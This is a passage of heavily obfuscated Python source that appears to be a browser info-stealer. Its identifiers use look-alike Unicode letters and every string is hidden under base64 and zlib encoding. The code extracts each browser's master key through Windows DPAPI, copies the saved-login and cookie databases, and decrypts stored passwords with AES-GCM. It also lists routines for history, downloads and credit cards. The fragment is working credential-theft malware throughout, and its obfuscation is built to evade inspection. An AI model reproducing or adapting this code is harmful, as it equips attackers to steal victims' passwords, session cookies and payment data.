𝘀𝘦𝙡𝘧.appdata + __𝘪𝙢𝘱𝘰𝙧𝘵__('base64').b64decode(__𝙞𝙢𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x8bp\r+O\x0c\xf7M\x0f\xf5\xf0*H\xc9u\xcbJ\rvrN\xce\xb54N6\n\xab\x8cp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00R\xa7\x0e\x8f')).decode(), __𝗶𝙢𝗽𝙤𝗿𝘵__('base64').b64decode(__𝗶𝗺𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xdaK\n\xcf\xc9J\xce\xb5\xacJ2\x8a2\xf0\t\x0f\xcb\x8e2\n\xb5\x05\x00Ji\x06\xb3')).decode(): 𝘴𝙚𝗹𝘧.appdata + __𝙞𝗺𝙥𝙤𝙧𝘵__('base64').b64decode(__𝘪𝗺𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x8bp5,\x884\xf6*K6\xb2\xccMq\xabp\x8brO\xc9\x89p\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00\xda\x1a\x0b\xa2')).decode(), __𝘪𝘮𝙥𝙤𝗿𝘁__('base64').b64decode(__𝗶𝙢𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xdaK\x89\xf0\xcaHJ\xb7\xb5\x05\x00\x0c\xc8\x02\xb2')).decode(): 𝙨𝙚𝗹𝙛.appdata + __𝘪𝘮𝗽𝗼𝙧𝘁__('base64').b64decode(__𝘪𝘮𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x8b\xf0\x08sI2.\xf0\x8b\n\x0f*\x88\x0c\xab\x08K\xceu+\x8dp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00\xe4H\x0c\x0c')).decode(), __𝗶𝙢𝘱𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xdaK\rw+\x8dr\x0f3\x01\x00\x0c\x9b\x02\xa3')).decode(): 𝙨𝗲𝗹𝘧.appdata + __𝙞𝗺𝙥𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x8bp\xcb\xc9H\xca\r\xcaIu\xab\x88\x8a\x0c7\xcd\x8e\x8a\xc8pN\xce\xb54N6\n\xab\x8cp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00[\x84\x0e\xcd')).decode(), __𝗶𝘮𝗽𝗼𝘳𝙩__('base64').b64decode(__𝙞𝙢𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x8b\xcc\xf3\xcaH\xc9\r\xb5\x05\x00\rT\x02\xdd')).decode(): 𝘀𝘦𝗹𝙛.appdata + __𝙞𝙢𝘱𝘰𝗿𝙩__('base64').b64decode(__𝙞𝙢𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x8bp\xf5\xaa\x8c\x8c\x88\xca\t5\xb2\xccM\xf1H\xc9H\xce\rK\x0e\xcc\xf3\xcaH\xc9\r-\x01\xd2e)\xc6~9\xc99\x15a\xc9Fa\x95\x9e\xaeA\x19)\xee\xae\xb6\x00\xe9\xfe\x12W')).decode(), __𝗶𝙢𝘱𝗼𝙧𝘵__('base64').b64decode(__𝙞𝘮𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xdaK\x8c\xf0*\x88r\xcf1L\n\xb4\xb5\x05\x00\x1a\xa4\x03\xdf')).decode(): 𝙨𝘦𝙡𝗳.appdata + __𝗶𝘮𝗽𝗼𝘳𝙩__('base64').b64decode(__𝙞𝙢𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x8bp\xcd\xa9L\x0c\x0f*H\t7L\x0e\x8b\xf0\xcbI\xcetr\x8d\x8c\x08\xca\x00\x00k\x07\x08r')).decode()})
        𝙨𝗲𝘁𝙖𝘵𝙩𝙧(𝘴𝙚𝘭𝗳, 'profiles', [__𝗶𝙢𝘱𝗼𝗿𝘵__('base64').b64decode(__𝗶𝙢𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x0br\x0f\xcb\x8d\x8c\x08+Nq\xb4\xb5\x05\x00\x1a\x9f\x03\xf6')).decode(), __𝗶𝗺𝘱𝙤𝗿𝘵__('base64').b64decode(__𝙞𝘮𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x0b\xf5\xf0*\x8b\xca\xcd)\x8e\nv\xac\x00\x00\x1c\x17\x04j')).decode(), __𝗶𝗺𝘱𝘰𝙧𝘵__('base64').b64decode(__𝘪𝘮𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x0b\xf5\xf0*\x8b\xca\xcd)\x8e\nv\xac\x04\x00\x1c\x18\x04k')).decode(), __𝙞𝘮𝗽𝗼𝘳𝙩__('base64').b64decode(__𝙞𝗺𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x0b\xf5\xf0*\x8b\xca\xcd)\x8e\nv\xac\x02\x00\x1c\x19\x04l')).decode(), __𝙞𝗺𝘱𝘰𝗿𝘁__('base64').b64decode(__𝗶𝙢𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x0b\xf5\xf0*\x8b\xca\xcd)\x8e\nv4\x00\x00\x1b\xcf\x04"')).decode(), __𝘪𝙢𝘱𝙤𝗿𝙩__('base64').b64decode(__𝗶𝙢𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x0b\xf5\xf0*\x8b\xca\xcd)\x8e\nv4\x04\x00\x1b\xd0\x04#')).decode()])
        for (_, 𝘱𝙖𝘁𝘩) in 𝘀𝘦𝗹𝙛.browsers.items():
            if not 𝘰𝘴.path.exists(𝘱𝙖𝘵𝙝):
                continue
            𝘀𝘦𝙩𝗮𝘵𝘁𝗿(𝙨𝗲𝙡𝘧, 'master_key', 𝙨𝙚𝙡𝘧.get_master_key(__𝙞𝗺𝘱𝗼𝗿𝘵__('base64').b64decode(__𝙞𝗺𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xdaK56L\x0eq\xb7\xcc\x8a\x0c/O\x0f5\x0e\xcaHq\x0f\xb5\x05\x00C*\x06x')).decode().format(𝙥𝙖𝘵𝙝)))
            if not 𝘀𝙚𝘭𝙛.master_key:
                continue
            for 𝘱𝘳𝗼𝙛𝙞𝙡𝘦 in 𝘴𝗲𝗹𝘧.profiles:
                if not 𝗼𝘀.path.exists(𝘱𝗮𝘁𝗵 + __𝙞𝗺𝙥𝘰𝘳𝘁__('base64').b64decode(__𝙞𝗺𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + 𝙥𝗿𝙤𝗳𝗶𝙡𝘦):
                    continue
                𝙤𝙥𝘦𝗿𝗮𝘵𝙞𝙤𝙣𝙨 = [𝙨𝘦𝙡𝗳.get_login_data, 𝙨𝗲𝗹𝗳.get_cookies, 𝙨𝙚𝗹𝗳.get_web_history, 𝙨𝗲𝗹𝗳.get_downloads, 𝘀𝘦𝙡𝘧.get_credit_cards]
                for 𝗼𝙥𝙚𝙧𝙖𝘁𝘪𝙤𝗻 in 𝘰𝘱𝗲𝗿𝗮𝘵𝗶𝘰𝙣𝙨:
                    try:
                        𝘰𝗽𝘦𝙧𝗮𝘵𝘪𝗼𝘯(𝘱𝗮𝙩𝗵, 𝙥𝘳𝙤𝙛𝘪𝗹𝘦)
                    except 𝘌𝙭𝙘𝙚𝗽𝙩𝘪𝗼𝘯 as e:
                        pass

    def get_master_key(self, path):
        if not 𝘰𝘴.path.exists(𝗽𝗮𝘁𝘩):
            return
        if __𝙞𝗺𝘱𝗼𝗿𝙩__('base64').b64decode(__𝙞𝙢𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xdaK2\xf6K\x8b4\xf62M\xf6\x08\xb4\x05\x00\x17\xac\x03\x8e')).decode() not in 𝗼𝘱𝗲𝙣(𝗽𝗮𝙩𝗵, __𝙞𝘮𝘱𝘰𝘳𝙩__('base64').b64decode(__𝙞𝘮𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKN\xb7\xb5\x05\x00\x03|\x01E')).decode(), encoding=__𝗶𝘮𝗽𝘰𝗿𝘵__('base64').b64decode(__𝙞𝙢𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()).read():
            return
        with 𝘰𝙥𝗲𝘯(𝙥𝗮𝘵𝗵, __𝘪𝘮𝙥𝙤𝙧𝘵__('base64').b64decode(__𝙞𝘮𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xdaKN\xb7\xb5\x05\x00\x03|\x01E')).decode(), encoding=__𝘪𝘮𝘱𝘰𝗿𝘁__('base64').b64decode(__𝗶𝗺𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝗳:
            𝙘 = 𝙛.read()
        𝘭𝙤𝙘𝘢𝙡_𝘴𝙩𝙖𝘵𝘦 = 𝙟𝘀𝗼𝙣.loads(𝙘)
        𝙢𝙖𝘴𝙩𝗲𝙧_𝘬𝙚𝙮 = 𝘣𝙖𝘴𝘦64.b64decode(𝙡𝙤𝘤𝘢𝘭_𝘴𝘁𝘢𝘁𝘦[__𝗶𝗺𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝗺𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xdaK2\xf6K\x8b4\xf62M\xf6\x08\xb4\x05\x00\x17\xac\x03\x8e')).decode()][__𝙞𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝘪𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x8b\n7\xcdJ\xce\xcb)Oq\x0f\xcb\x8e0*\xc9I\r\xb4\xb5\x05\x00K\xf6\x07\x0b')).decode()])
        𝙢𝘢𝘴𝘵𝗲𝗿_𝘬𝗲𝘆 = 𝙢𝙖𝙨𝙩𝗲𝗿_𝗸𝘦𝙮[𝙞𝙣𝘵.from_bytes(𝙢𝙖𝘱(lambda O, i: 436 - (𝙞𝗻𝙩(𝙊) + 𝘪), 𝘮𝙖𝙥(__𝗶𝗺𝗽𝘰𝙧𝘁__('base64').b64decode(__𝙞𝘮𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝗽(*[𝘪𝘵𝙚𝗿(__𝘪𝗺𝙥𝘰𝗿𝙩__('base64').b64decode(__𝙞𝙢𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\xf3s\xf1\xad\x00\x00\x03\x1a\x01X')).decode())] * 3)), 𝙧𝙖𝘯𝗴𝘦(1)), __𝙞𝗺𝙥𝙤𝙧𝘵__('base64').b64decode(__𝗶𝗺𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):]
        𝙢𝗮𝙨𝙩𝗲𝘳_𝗸𝘦𝙮 = 𝘊𝘳𝘺𝙥𝘁𝗨𝗻𝗽𝙧𝙤𝘁𝙚𝘤𝘁𝘋𝘢𝘵𝙖(𝙢𝙖𝘴𝘵𝘦𝘳_𝘬𝙚𝘺, None, None, None, 𝙞𝗻𝙩.from_bytes(𝙢𝘢𝘱(lambda O, i: 778 - (𝗶𝙣𝘁(𝗢) + 𝘪), 𝗺𝘢𝘱(__𝘪𝗺𝘱𝙤𝗿𝘵__('base64').b64decode(__𝘪𝘮𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝗶𝘵𝗲𝗿(__𝗶𝘮𝗽𝗼𝗿𝘁__('base64').b64decode(__𝘪𝘮𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝘢𝗻𝗴𝘦(0)), __𝗶𝗺𝗽𝘰𝘳𝘵__('base64').b64decode(__𝙞𝙢𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))[𝙞𝗻𝘵.from_bytes(𝙢𝙖𝗽(lambda O, i: 753 - (𝘪𝘯𝘵(𝘖) + 𝗶), 𝘮𝙖𝙥(__𝗶𝘮𝗽𝙤𝙧𝙩__('base64').b64decode(__𝗶𝙢𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝗶𝘁𝗲𝗿(__𝘪𝙢𝙥𝘰𝙧𝘵__('base64').b64decode(__𝘪𝗺𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xda\xf3\xab\n\xad\x04\x00\x03\xcd\x01\x97')).decode())] * 3)), 𝗿𝘢𝘯𝘨𝗲(1)), __𝙞𝙢𝘱𝙤𝙧𝙩__('base64').b64decode(__𝗶𝗺𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]
        return 𝙢𝘢𝙨𝘵𝘦𝙧_𝙠𝙚𝙮

    def decrypt_password(self, buff, master_key):
        𝗶𝙫 = 𝙗𝘶𝗳𝘧[𝘪𝗻𝙩.from_bytes(𝘮𝘢𝗽(lambda O, i: 335 - (𝗶𝙣𝘵(𝗢) + 𝘪), 𝘮𝗮𝙥(__𝘪𝗺𝗽𝘰𝘳𝘵__('base64').b64decode(__𝙞𝘮𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝘱(*[𝙞𝙩𝗲𝙧(__𝘪𝗺𝙥𝘰𝘳𝙩__('base64').b64decode(__𝙞𝙢𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xad\xf2\xad\x04\x00\x03\xb9\x01\x8e')).decode())] * 3)), 𝗿𝘢𝘯𝙜𝘦(1)), __𝗶𝙢𝙥𝘰𝙧𝘁__('base64').b64decode(__𝙞𝙢𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):𝙞𝗻𝙩.from_bytes(𝘮𝙖𝗽(lambda O, i: 939 - (𝗶𝙣𝘁(𝘖) + 𝙞), 𝙢𝘢𝘱(__𝗶𝘮𝙥𝙤𝗿𝘵__('base64').b64decode(__𝘪𝗺𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝙥(*[𝗶𝙩𝘦𝘳(__𝘪𝙢𝙥𝗼𝘳𝘵__('base64').b64decode(__𝗶𝗺𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\xf3\x0f\xf14\x00\x00\x02\xfe\x01\x1d')).decode())] * 3)), 𝗿𝘢𝙣𝘨𝘦(1)), __𝘪𝗺𝘱𝗼𝗿𝘁__('base64').b64decode(__𝙞𝙢𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]
        𝙥𝙖𝘆𝗹𝗼𝙖𝘥 = 𝘣𝘂𝙛𝙛[𝙞𝘯𝘵.from_bytes(𝙢𝙖𝙥(lambda O, i: 296 - (𝘪𝘯𝘁(𝘖) + 𝙞), 𝙢𝘢𝙥(__𝘪𝙢𝗽𝙤𝘳𝙩__('base64').b64decode(__𝙞𝘮𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝗽(*[𝗶𝘁𝙚𝙧(__𝙞𝙢𝙥𝗼𝗿𝘁__('base64').b64decode(__𝙞𝘮𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xcdJ\xaf\x00\x00\x03\xbc\x01\x97')).decode())] * 3)), 𝗿𝘢𝘯𝗴𝙚(1)), __𝘪𝙢𝙥𝗼𝗿𝘁__('base64').b64decode(__𝗶𝗺𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):]
        𝗰𝙞𝗽𝙝𝘦𝙧 = 𝗔𝘌𝙎.new(𝘮𝘢𝘴𝙩𝙚𝙧_𝗸𝗲𝘆, 𝘼𝗘𝗦.MODE_GCM, 𝘪𝙫)
        𝘥𝘦𝘤𝙧𝘆𝘱𝘁𝗲𝘥_𝘱𝗮𝙨𝙨 = 𝘤𝘪𝘱𝙝𝗲𝘳.decrypt(𝗽𝙖𝘆𝗹𝙤𝘢𝙙)
        𝙙𝘦𝙘𝗿𝙮𝙥𝘁𝗲𝙙_𝗽𝗮𝘴𝙨 = 𝗱𝗲𝗰𝗿𝘆𝙥𝘵𝗲𝙙_𝗽𝘢𝘴𝙨[:-𝗶𝗻𝙩.from_bytes(𝘮𝗮𝙥(lambda O, i: 597 - (𝗶𝙣𝘵(𝙊) + 𝗶), 𝘮𝘢𝘱(__𝘪𝗺𝗽𝙤𝙧𝙩__('base64').b64decode(__𝙞𝙢𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝗽(*[𝘪𝘵𝗲𝙧(__𝙞𝗺𝘱𝗼𝘳𝙩__('base64').b64decode(__𝙞𝗺𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xf3\x0bI\xaf\x00\x00\x03~\x01\x82')).decode())] * 3)), 𝙧𝗮𝘯𝗴𝘦(1)), __𝘪𝙢𝙥𝙤𝙧𝘵__('base64').b64decode(__𝙞𝗺𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].decode()
        return 𝙙𝘦𝗰𝗿𝙮𝘱𝘁𝙚𝘥_𝙥𝗮𝙨𝙨

    def get_login_data(self, path, profile):
        𝗹𝘰𝙜𝗶𝗻_𝘥𝘣 = __𝘪𝙢𝘱𝘰𝘳𝘁__('base64').b64decode(__𝙞𝗺𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaK56LN\x05\xe2\x10w\xcb\xbc\xc4p\x93\xf4 w7\x83\xc8@[[\x00Z\\\x07!')).decode().format(𝗽𝙖𝘵𝘩, 𝗽𝗿𝘰𝙛𝘪𝙡𝙚)
        if not 𝗼𝘀.path.exists(𝘭𝘰𝘨𝘪𝘯_𝙙𝘣):
            return
        𝘀𝗵𝘶𝙩𝙞𝘭.copy(𝙡𝙤𝗴𝙞𝗻_𝘥𝙗, __𝗶𝗺𝘱𝘰𝙧𝘵__('base64').b64decode(__𝘪𝗺𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())
        𝗰𝙤𝘯𝘯 = 𝘴𝙦𝙡𝘪𝘵𝙚3.connect(__𝘪𝘮𝘱𝗼𝘳𝘵__('base64').b64decode(__𝙞𝗺𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())
        𝙘𝘶𝘳𝘀𝗼𝙧 = 𝘤𝙤𝘯𝗻.cursor()
        𝘤𝘶𝙧𝙨𝘰𝘳.execute(__𝗶𝙢𝗽𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x05\xc1\xbb\x0e@0\x14\x00\xd0_\xd2\x9a:XH\xfa\x10:\x90\xbe\xeeX\x06\xe1\x9a\xa4\x0f\xbe\xde9\xa6\xb1\xf3b\xb4Q\x82\x9f\xbb\xc0\x1c\x91\x91\xed.\x8f\x92\xf6\x03?\xa6\xe0\x08\xfa\x16\x8e(-NC_\x82\xd7\xdfN\xd9\x0b\x9c\xd1\xe0*\x81\xb5\x17\xe6bZ\x89\x9a\x81b\xdaJ\xd7\xfd\xaf\xbb\x1c3')).decode())
        for 𝗿𝙤𝘸 in 𝗰𝙪𝗿𝘀𝗼𝙧.fetchall():
            if not 𝘳𝘰𝙬[𝗶𝗻𝘁.from_bytes(𝙢𝘢𝘱(lambda O, i: 908 - (𝘪𝙣𝙩(𝗢) + 𝗶), 𝙢𝗮𝗽(__𝙞𝗺𝙥𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝘱(*[𝙞𝘁𝘦𝗿(__𝗶𝘮𝙥𝙤𝙧𝙩__('base64').b64decode(__𝗶𝗺𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝘢𝗻𝗴𝘦(0)), __𝗶𝗺𝗽𝙤𝗿𝘵__('base64').b64decode(__𝗶𝙢𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝗿𝙤𝘸[𝘪𝗻𝘁.from_bytes(𝘮𝗮𝙥(lambda O, i: 426 - (𝘪𝗻𝘁(𝗢) + 𝙞), 𝙢𝘢𝗽(__𝘪𝙢𝗽𝗼𝘳𝙩__('base64').b64decode(__𝗶𝗺𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝗽(*[𝙞𝘵𝗲𝗿(__𝗶𝘮𝘱𝗼𝘳𝘵__('base64').b64decode(__𝙞𝗺𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3s\xf14\x04\x00\x02\xcb\x01\r')).decode())] * 3)), 𝘳𝗮𝙣𝗴𝗲(1)), __𝘪𝗺𝙥𝙤𝘳𝘵__('base64').b64decode(__𝙞𝘮𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝘳𝗼𝘸[𝗶𝙣𝙩.from_bytes(𝙢𝘢𝗽(lambda O, i: 605 - (𝘪𝘯𝘁(𝘖) + 𝘪), 𝗺𝗮𝘱(__𝙞𝙢𝙥𝘰𝗿𝙩__('base64').b64decode(__𝘪𝙢𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝘱(*[𝘪𝘵𝘦𝘳(__𝙞𝙢𝙥𝙤𝙧𝘵__('base64').b64decode(__𝘪𝘮𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xcbr\xac\x02\x00\x03v\x01t')).decode())] * 3)), 𝘳𝙖𝘯𝘨𝙚(1)), __𝘪𝘮𝘱𝘰𝘳𝘁__('base64').b64decode(__𝘪𝘮𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            𝗽𝗮𝘀𝘴𝘸𝙤𝘳𝙙 = 𝘴𝗲𝘭𝙛.decrypt_password(𝗿𝙤𝘄[𝙞𝙣𝘵.from_bytes(𝘮𝘢𝘱(lambda O, i: 358 - (𝘪𝙣𝘵(𝙊) + 𝘪), 𝘮𝗮𝙥(__𝘪𝘮𝗽𝙤𝘳𝘵__('base64').b64decode(__𝙞𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝗽(*[𝙞𝙩𝙚𝗿(__𝗶𝘮𝙥𝗼𝙧𝘁__('base64').b64decode(__𝗶𝘮𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xad\n5\x02\x00\x03\x82\x01O')).decode())] * 3)), 𝙧𝙖𝘯𝙜𝗲(1)), __𝗶𝘮𝘱𝙤𝘳𝘁__('base64').b64decode(__𝙞𝘮𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘴𝙚𝘭𝙛.master_key)
            __𝙇𝘖𝘎𝘐𝗡𝘚__.append(𝙏𝙮𝗽𝗲𝘀.Login(𝗿𝗼𝘄[𝗶𝙣𝘵.from_bytes(𝗺𝗮𝘱(lambda O, i: 268 - (𝙞𝗻𝘁(𝘖) + 𝙞), 𝘮𝘢𝘱(__𝘪𝙢𝘱𝘰𝙧𝘵__('base64').b64decode(__𝙞𝙢𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝙥(*[𝗶𝙩𝙚𝗿(__𝘪𝗺𝙥𝗼𝗿𝘁__('base64').b64decode(__𝙞𝙢𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝘢𝗻𝙜𝘦(0)), __𝙞𝗺𝘱𝘰𝗿𝘵__('base64').b64decode(__𝘪𝗺𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘳𝘰𝘄[𝘪𝗻𝘵.from_bytes(𝗺𝗮𝙥(lambda O, i: 298 - (𝘪𝘯𝘁(𝘖) + 𝗶), 𝙢𝗮𝙥(__𝘪𝗺𝙥𝗼𝗿𝘵__('base64').b64decode(__𝗶𝘮𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝘱(*[𝘪𝙩𝗲𝘳(__𝘪𝗺𝗽𝗼𝗿𝙩__('base64').b64decode(__𝘪𝙢𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xcd\xca6\x06\x00\x03\x7f\x01V')).decode())] * 3)), 𝗿𝗮𝗻𝗴𝙚(1)), __𝙞𝘮𝙥𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗽𝘢𝘀𝘴𝘄𝘰𝗿𝙙))
        𝘤𝗼𝗻𝘯.close()
        𝘰𝘀.remove(__𝙞𝙢𝘱𝘰𝗿𝘁__('base64').b64decode(__𝘪𝙢𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())

    def get_cookies(self, path, profile):
        𝙘𝙤𝙤𝗸𝘪𝙚_𝗱𝗯 = __𝘪𝗺𝙥𝗼𝙧𝘵__('base64').b64decode(__𝙞𝗺𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xdaK56LN\x05\xe2\x90\xdc0\x83\x14#\xcb\xcaD\xc3\n\x97$#\xcb\xa2\xc4\xf0\xb0*\x00}L\x08\xfd')).decode().format(𝘱𝗮𝙩𝗵, 𝘱𝘳𝙤𝘧𝗶𝘭𝘦)
        if not 𝗼𝘴.path.exists(𝙘𝘰𝙤𝗸𝙞𝙚_𝘥𝗯):
            return
        try:
            𝙨𝙝𝘶𝘵𝘪𝗹.copy(𝙘𝘰𝙤𝘬𝘪𝘦_𝘥𝙗, __𝙞𝘮𝘱𝙤𝗿𝘵__('base64').b64decode(__𝘪𝘮𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9\x890\n\xca\x04\x00\x18\xcb\x03\xeb')).decode())
            𝘤𝗼𝗻𝙣 = 𝘴𝙦𝗹𝘪𝘁𝙚3.connect(__𝙞𝘮𝘱𝗼𝗿𝙩__('base64').b64decode(__𝙞𝙢𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9\x890\n\xca\x04\x00\x18\xcb\x03\xeb')).decode())
            𝙘𝙪𝘳𝘀𝗼𝙧 = 𝗰𝙤𝙣𝙣.cursor()
            𝘤𝙪𝗿𝙨𝗼𝙧.execute(__𝘪𝗺𝗽𝙤𝗿𝘵__('base64').b64decode(__𝗶𝗺𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5t\xcf(K6\x0eJK4\n3\xf5qv*\x8d\x0c7\xcc\x01\xd2\xe5\x91\x11A\xf9@:\')\xd7\xaf25\xc2\xc9 *<(-%\xd7\xad8%<\xb48*"\xa3<1\xc2+\'\xd9\xd0\xd20\xc5\xdd7=(\xc7+ $\xd8)+\xc9\xc8\xb2(1<\xac\n\x00\x84\xd0\x1e\xe1')).decode())
            for 𝙧𝘰𝘄 in 𝙘𝘂𝗿𝙨𝗼𝘳.fetchall():
